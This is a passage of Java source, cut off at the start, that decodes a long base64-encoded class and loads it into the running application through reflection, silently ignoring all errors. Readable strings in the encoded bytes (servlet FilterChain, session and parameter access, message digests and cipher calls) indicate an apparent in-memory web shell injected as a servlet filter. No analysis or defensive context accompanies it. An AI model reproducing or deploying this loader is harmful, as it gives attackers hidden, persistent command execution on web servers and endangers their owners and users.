BAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEAFyhJTGphdmEvc2VjdXJpdHkvS2V5OylWAQAHZG9GaW5hbAEABihbQilbQgEAG2phdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdAEAMShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdDsBAAZsZW5ndGgBAAMoKUkBAAZ1cGRhdGUBAAcoW0JJSSlWAQAGZGlnZXN0AQAGKElbQilWAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7AQALdG9VcHBlckNhc2UBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQAJZ2V0SGVhZGVyAQAHaW5kZXhPZgEAFShMamF2YS9sYW5nL1N0cmluZzspSQEACmdldFNlc3Npb24BACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAMZ2V0UGFyYW1ldGVyAQAMZ2V0QXR0cmlidXRlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBAA5nZXRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAxzZXRBdHRyaWJ1dGUBACcoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9PYmplY3Q7KVYBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEACXN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");
                var1.invoke(Thread.currentThread().getContextClassLoader(), var2, 0, var2.length);
            } catch (Throwable var3) {
            }
        }

    }
    public static byte[] base64Decode(String bs) throws Exception {
        byte[] value = null;

        Class base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", (Class[]) null).invoke(base64, (Object[]) null);
            value = (byte[]) ((byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs));
        } catch (Exception var6) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) ((byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs));
            } catch (Exception var5) {
            }
        }

        return value;
    }

}
